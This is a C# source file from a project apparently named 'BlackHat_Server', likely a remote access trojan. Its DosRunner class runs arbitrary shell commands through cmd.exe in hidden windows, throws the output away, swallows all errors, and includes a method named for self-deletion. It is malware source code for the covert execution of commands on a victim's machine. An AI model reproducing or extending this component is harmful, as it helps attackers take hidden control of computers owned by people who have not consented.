using System.Diagnostics;

namespace BlackHat_Server.Class
{
    internal class DosRunner
    {
        /// <summary>
        ///     Esegue un comando da dos
        /// </summary>
        /// <param name="dosCMD"></param>
        public void RunDosSelfDelete(string dosCMD)
        {
            try
            {
                if (!string.IsNullOrEmpty(dosCMD))
                {
                    var Info = new ProcessStartInfo();

                    Info.Arguments = dosCMD;

                    Info.WindowStyle = ProcessWindowStyle.Hidden;
                    Info.CreateNoWindow = true;
                    Info.FileName = "cmd.exe";
                    Process.Start(Info);
                }
            }
            catch
            {
            }
        }
        //-------------------------------------

        /// <summary>
        ///     Executes a shell command synchronously.
        /// </summary>
        /// <param name="command">string command</param>
        /// <param name="workingDirectory"></param>
        /// <returns>string, as output of the command.</returns>
        public void ExecuteCommand(string command, string workingDirectory = null)
        {
            try
            {
                var procStartInfo =
                    new ProcessStartInfo("cmd", "/c " + command);

                //REMOVE THIS
                if(!string.IsNullOrEmpty(workingDirectory))
                    procStartInfo.WorkingDirectory = workingDirectory;
                
                procStartInfo.RedirectStandardOutput = true;
                procStartInfo.UseShellExecute = false;

                procStartInfo.CreateNoWindow = true;

                var proc = new Process();
                proc.StartInfo = procStartInfo;
                proc.Start();

                var result = proc.StandardOutput.ReadToEnd();
                var t = result;
            }
            catch
            {
            }
        }
        //--------------------------------------
    }
}